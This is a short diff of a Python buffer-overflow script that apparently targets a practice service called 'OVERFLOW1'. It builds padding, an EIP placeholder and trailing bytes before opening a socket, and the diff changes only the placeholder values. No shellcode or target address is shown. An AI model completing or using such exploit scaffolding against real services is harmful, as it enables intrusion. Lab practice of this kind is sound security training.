@@ -9,8 +9,8 @@ import sys
 
 header = "OVERFLOW1 "
 filler = "A" * 1978
-eip = "B" * 4
-extend = "C" * 2000
+eip = "X" * 4
+extend = "E" * 512
 
 try:
     s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
